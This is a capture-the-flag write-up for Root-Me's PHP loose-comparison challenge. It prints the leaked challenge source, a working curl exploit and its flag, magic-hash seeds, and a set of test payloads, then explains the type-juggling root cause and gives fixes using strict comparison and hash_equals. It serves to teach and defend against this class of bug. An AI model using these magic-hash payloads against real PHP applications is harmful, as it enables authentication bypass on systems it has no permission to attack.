# Root-Me — Web-Server / PHP - Loose Comparison (ch55)

- **Target:** http://challenge01.root-me.org/web-serveur/ch55/
- **Class:** PHP type juggling — magic hashes (`0e` collision) in a loose comparison
- **Author / date:** ghozt, 10 January 2018
- **Goal:** find a way to get the flag (no bruteforce)

## Flag

```
F34R_Th3_L0o5e_C0mP4r15On
```

Byte-exact (od dump, no trailing whitespace):

```
f l a g :   F 3 4 R _ T h 3 _ L 0 o 5 e _ C 0 m P 4 r 1 5 O n \n
```

## One-line exploit

```bash
curl -s -X POST -d "s=0e&h=240610708&submit=Check" \
  "http://challenge01.root-me.org/web-serveur/ch55/index.php"
# -> Well done! Here is your flag: F34R_Th3_L0o5e_C0mP4r15On
```

## The source (leaked via `index.php?source`)

```php
function gen_secured_random() {
    // cause random is the way
    $a = rand(1337,2600)*42;
    $b = rand(1879,1955)*42;
    $a < $b ? $a ^= $b ^= $a ^= $b : $a = $b;
    return $a+$b;
}
function secured_hash_function($plain) {
    // cause md5 is the best hash ever
    $secured_plain = sanitize_user_input($plain);
    return md5($secured_plain);
}
function sanitize_user_input($input) {
    // cause someone told me to never trust user input
    $re = '/[^a-zA-Z0-9]/';
    $secured_input = preg_replace($re, "", $input);
    return $secured_input;
}
if (isset($_GET['source'])) { show_source(__FILE__); die(); }
require_once "secret.php";
if (isset($_POST['s']) && isset($_POST['h'])) {
    $s = sanitize_user_input($_POST['s']);
    $h = secured_hash_function($_POST['h']);
    $r = gen_secured_random();
    if ($s != false && $h != false) {
        if ($s.$r == $h) {
            print "Well done! Here is your flag: ".$flag;
        } else {
            print "Fail...";
        }
    } else {
        print "Hum ...";
    }
}
```

The form posts `s` (seed) and `h` (hash) and the check is a single loose comparison:

```php
$s.$r == $h
```

where `$r` is a **random** integer — hence "Unbreakable Random" and "No bruteforce needed".

## Analysis

Three observations kill the challenge:

**1. `$r` is irrelevant.** The XOR-swap looks like it does something, but `$a ^= $b ^= $a ^= $b`
(in PHP's left-to-right evaluation) ends up merely exchanging the two values — and the
returned expression is `$a + $b`, which is **order-independent**. So:

```
$a ∈ [1337,2600]·42 = [56154, 109200]
$b ∈ [1879,1955]·42 = [78918,  82110]
$r = $a + $b        ∈ [135072, 191310]      // always a 6-digit integer
```

The randomness is decorative. We never need to know `$r`.

**2. `sanitize_user_input()` is not a security control.** It strips every character
outside `[a-zA-Z0-9]` — but `0`, `e` and the digits we need all survive, and the magic-hash
seeds (`240610708`, `QNKCDZO`, …) are pure alphanumeric. The "never trust user input"
comment is doing a lot of heavy lifting for a regex that removes nothing we care about.

**3. `==` is a loose comparison, and both sides are *numeric strings*.** PHP compares two
numeric strings **numerically**. Both sides of the check can be forced into `0e<digits>`
form, which PHP parses as the float `0`:

- **Right side `$h`** is `md5(...)` — a 32-char hex string. If the md5 happens to be
  `0e` followed by 30 digits, it is a valid float literal → `0`. These are the classic
  **magic hashes**.
- **Left side `$s.$r`** is `$s` concatenated with `$r`. Setting `$s = "0e"` makes it
  `"0e" . $r` = `"0e135072"` (or whatever `$r` is) — `0e` followed by digits → also a
  valid float literal → `0`.

Therefore `0 == 0` → **true**, for *any* value of `$r`.

The guard `$s != false && $h != false` passes too: `"0e"` is a non-empty string that is
not `"0"`, so it is truthy, and the md5 string is truthy as well.

## The magic hash

`md5("240610708")` = `0e462097431906509019562988736854`

`0e` + 30 digits. All other candidates below work identically:

| Seed (`h`) | `md5(seed)` |
|---|---|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `aabg7XSs` | `0e087386482136013740957780965295` |
| `aabC9RqS` | `0e041022518165728065344349536299` |

Note `h` is itself passed through `sanitize_user_input()`, so the seed must be
alphanumeric — all four above are. (Appending junk like `240610708!!!` still works: the
`!`s are stripped before hashing, which is worth knowing if a WAF blocks a clean seed.)

## Exploit chain

```bash
U="http://challenge01.root-me.org/web-serveur/ch55/index.php"

# 1. Leak the source
curl -s "$U?source"

# 2. Identify the magic-hash candidate (any 0e\d{30} md5)
printf '%s' '240610708' | md5sum
#    0e462097431906509019562988736854

# 3. Send s=0e (so $s.$r becomes a "0e…" numeric string) with the magic seed
curl -s -X POST -d "s=0e&h=240610708&submit=Check" "$U"
#    Well done! Here is your flag: F34R_Th3_L0o5e_C0mP4r15On
```

## Negative controls

| # | Payload | Expected | Observed |
|---|---|---|---|
| 1 | `s=0e&h=240610708` | numeric-string collision | `Well done!` |
| 2 | same, repeated 5× | deterministic (no bruteforce) | `Well done!` ×5 |
| 3 | `s=0e&h=QNKCDZO` / `aabg7XSs` / `aabC9RqS` | any magic hash works | `Well done!` ×3 |
| 4 | `s=0e&h=0e` (md5 not magic) | reject | `Fail...` |
| 5 | `s=abc&h=240610708` (LHS not numeric) | string compare, reject | `Fail...` |
| 6 | `s=1e&h=240610708` (`1e…` is numeric but ≠ 0) | reject | `Fail...` |
| 7 | `s=` (empty) | fails `$s != false` | `Hum ...` |
| 8 | `s=0e&h=240610708!!!` | sanitize strips `!` → still works | `Well done!` |

Control 6 is the sharpest: `"1e135072"` is *also* a valid numeric string, so PHP does
compare numerically — but `1e135072 ≠ 0`, so it fails. That proves the mechanism is
**numeric comparison of `0e…` strings**, not a string-prefix artefact. Control 5 shows
the left side must be numeric; control 4 shows the right side must be a magic hash.

## Root cause

1. **`==` instead of `===`.** Loose comparison coerces both operands. Two strings that are
   both valid numeric literals get compared *as numbers*, silently discarding the fact
   that they are completely different strings.
2. **Magic hashes exist.** `0e` followed by digits is a valid float literal, so ~1 in
   10²⁹·¹ md5 outputs collide with every other `0e…` value. Here that is not even a
   probability game — the attacker *picks* a known colliding seed.
3. **The randomness is a red herring.** `$r` is meant to make the comparison unguessable,
   but because the left operand's *type* (numeric string) is attacker-controlled via `$s`,
   the value of `$r` never matters. Unpredictable data does not fix a type-confusion bug.
4. **Sanitisation ≠ validation.** Stripping non-alphanumerics does not prevent injection of
   `0e`-style numeric strings, and it is applied to both operands without any type check.

## Fix

- **Use `===`.** It compares type *and* value, so `"0e135072" === "0e46209709…"` is simply
  `false`:

  ```php
  if ($s . $r === $h) { ... }
  ```

- **Use `hash_equals()`** for any secret/hash comparison — constant-time and
  type-strict. Comparing digests is exactly the case it exists for:

  ```php
  if (hash_equals($h, $s . $r)) { ... }
  ```

- **Validate types, don't sanitise.** Reject anything that is not the expected shape:

  ```php
  if (!is_string($_POST['s']) || !preg_match('/^[a-zA-Z0-9]+$/', $_POST['s'])) { /* 400 */ }
  ```

- **Don't rely on `rand()` for security** — and, more to the point, don't rely on
  unpredictability to compensate for a comparison bug. If the value must be secret, use
  `random_bytes()`/`random_int()` **and** compare it strictly.

## Generalisation

Any PHP loose comparison where an attacker controls one operand's *string form* is
suspect. Recurring shapes:

- `md5($input) == $known_hash` → magic-hash bypass
- `$token == $stored` → `"0e123" == "0e456"`
- `strcmp()` / `in_array()` without the strict flag
- Numeric-looking input against a string column, or vice versa

Grep heuristic for code review: `==` or `!=` adjacent to `md5(`, `sha1(`, `hash(`,
`strcmp`, or `in_array` without `true`.
